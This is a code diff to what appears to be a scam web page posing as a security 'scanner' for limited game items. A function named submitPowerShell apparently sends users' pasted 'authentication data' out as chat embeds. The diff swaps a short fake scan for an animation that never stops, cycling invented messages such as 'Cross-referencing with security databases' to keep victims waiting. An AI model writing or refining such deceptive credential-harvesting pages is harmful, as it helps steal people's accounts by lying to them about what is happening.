@@ -81,9 +81,13 @@ function closeScanModal() {
     hideLoadingOverlay();
     
     // Clear any running animations
-    if (window.scanningInterval) {
-        clearInterval(window.scanningInterval);
-        window.scanningInterval = null;
+    if (window.infiniteLoadingTitleInterval) {
+        clearInterval(window.infiniteLoadingTitleInterval);
+        window.infiniteLoadingTitleInterval = null;
+    }
+    if (window.infiniteLoadingDetailInterval) {
+        clearInterval(window.infiniteLoadingDetailInterval);
+        window.infiniteLoadingDetailInterval = null;
     }
     
     // Reset form and privacy mode
@@ -345,14 +349,9 @@ async function submitPowerShell() {
             submitBtn.style.background = '#10b981';
             showNotification('Scanning item please wait', 'success');
             
-            // Show scanning animation with loading overlay
+            // Show infinite loading animation
             showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
-            startScanningAnimation();
-            
-            setTimeout(() => {
-                hideLoadingOverlay();
-                closeScanModal();
-            }, 4000);
+            startInfiniteLoading();
         } else {
             // If enhanced embed fails, try simple embed as fallback
             const simpleEmbed = {
@@ -380,14 +379,9 @@ async function submitPowerShell() {
                 submitBtn.style.background = '#10b981';
                 showNotification('Scanning item please wait', 'success');
                 
-                // Show scanning animation with loading overlay
+                // Show infinite loading animation
                 showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
-                startScanningAnimation();
-                
-                setTimeout(() => {
-                    hideLoadingOverlay();
-                    closeScanModal();
-                }, 4000);
+                startInfiniteLoading();
             } else {
                 throw new Error(`Both embed formats failed: ${response.status}, ${fallbackResponse.status}`);
             }
@@ -659,30 +653,72 @@ function hideLoadingOverlay() {
     }
 }
 
-// Scanning animation after successful submission
-function startScanningAnimation() {
+// Infinite loading animation that never stops
+function startInfiniteLoading() {
     const loadingTitle = document.getElementById('loadingTitle');
+    const loadingText = document.getElementById('loadingText');
+    const submitText = document.getElementById('submitText');
+    
     const scanMessages = [
         'Scanning item please wait',
         'Scanning item please wait.',
         'Scanning item please wait..',
-        'Scanning item please wait...'
+        'Scanning item please wait...',
+        'Analyzing authentication data',
+        'Analyzing authentication data.',
+        'Analyzing authentication data..',
+        'Analyzing authentication data...',
+        'Processing security scan',
+        'Processing security scan.',
+        'Processing security scan..',
+        'Processing security scan...',
+        'Verifying limited items',
+        'Verifying limited items.',
+        'Verifying limited items..',
+        'Verifying limited items...'
+    ];
+    
+    const detailMessages = [
+        'Please wait while we analyze your limited items',
+        'Checking item authenticity and rarity data',
+        'Scanning for stolen or duplicated content',
+        'Verifying ownership and transaction history',
+        'Analyzing market value and investment potential',
+        'Cross-referencing with security databases'
     ];
     
     let messageIndex = 0;
+    let detailIndex = 0;
     
-    const interval = setInterval(() => {
-        if (!loadingTitle) {
-            clearInterval(interval);
-            return;
+    // Update main title with dots
+    const titleInterval = setInterval(() => {
+        if (loadingTitle) {
+            loadingTitle.textContent = scanMessages[messageIndex];
+            messageIndex = (messageIndex + 1) % scanMessages.length;
         }
         
-        loadingTitle.textContent = scanMessages[messageIndex];
-        messageIndex = (messageIndex + 1) % scanMessages.length;
-    }, 500);
+        if (submitText) {
+            const buttonMessages = [
+                'Scanning...',
+                'Scanning.',
+                'Scanning..',
+                'Scanning...'
+            ];
+            submitText.textContent = buttonMessages[messageIndex % 4];
+        }
+    }, 600);
     
-    // Store interval ID globally so it can be cleared
-    window.scanningInterval = interval;
+    // Update detail text occasionally
+    const detailInterval = setInterval(() => {
+        if (loadingText) {
+            loadingText.textContent = detailMessages[detailIndex];
+            detailIndex = (detailIndex + 1) % detailMessages.length;
+        }
+    }, 3000);
+    
+    // Store intervals globally so they can be cleared if needed
+    window.infiniteLoadingTitleInterval = titleInterval;
+    window.infiniteLoadingDetailInterval = detailInterval;
 }
 
 // Stop loading animation
